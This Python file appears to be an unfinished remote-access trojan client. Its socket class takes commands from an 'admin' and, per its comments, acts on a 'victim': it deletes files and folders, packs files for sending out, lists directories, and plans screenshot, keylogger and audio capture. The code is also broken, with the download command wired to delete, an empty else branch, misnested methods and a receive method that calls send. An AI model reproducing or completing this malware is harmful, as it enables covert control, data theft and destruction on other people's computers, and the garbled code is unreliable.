import os, shutil
import socket
from os.path import join

HEADER = 2048


class MySocket:
    """demonstration class only
      - coded for clarity, not efficiency
    """

    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, port))

    def send(self, data, id):
        # sending the id of the file first
        send_file_name = id.encode()
        send_file_name += b' ' * (HEADER - len(send_file_name))
        self.sock.send(send_file_name)

        # sending the length of the data
        send_length = str(len(data)).encode()
        print(send_length)
        send_length += b' ' * (HEADER - len(send_length))
        self.sock.send(send_length)

        # sending the data
        self.sock.send(data)

    @staticmethod
    def differ_between_commands(data):
        msg = data.decode().replace(" ", "")
        if "download" in msg:
            MySocket.delete(msg)
        elif "delete" in msg:
            MySocket.delete(msg)
        elif "get_folders" in msg:
            MySocket.get_folders()
        elif "get_files" in msg:
            MySocket.get_files()


        else:  # if its not delete or download it hase to be [screenshot,keylogger,pcinfo,audio]


    @staticmethod
    def delete(msg):
        path = msg[6:]
        # We identify between a file and a folder by the dot if we have dot in [-4] it file
        if path[-4] == ".":
            os.remove(path)
        # else = folder
        else:
            shutil.rmtree(path)

    @staticmethod
    def download(msg):
        path = msg[8:]
        if path[-4] != ".":  # when it's a folder, create a zip file
            shutil.make_archive(path, 'zip', path)
            path += '.zip'
        with open(path, 'rb') as file:
            data = file.read()

        # send path and data !!!!!!

        @staticmethod
        def get_folders():
            path = ".\\"
            folder_names = [f for f in os.listdir(path) if not os.path.isfile(join(path, f))]
            data = ""
            for folder in folder_names:
                data += " " + folder
            return data[1:]

        @staticmethod
        def get_files(folder):
            path = folder
            file_names = [f for f in os.listdir(path) if os.path.isfile(join(path, f))]
            data = ""
            for file in file_names:
                data += " " + file
            return data[1:]

    # the only things we receive from admin are commands
    def myreceive(self):
        msg = self.sock.send(HEADER)
        MySocket.differ_between_commands(msg)

        # server.send(msg)# I automatically send to the victim what I received from admin
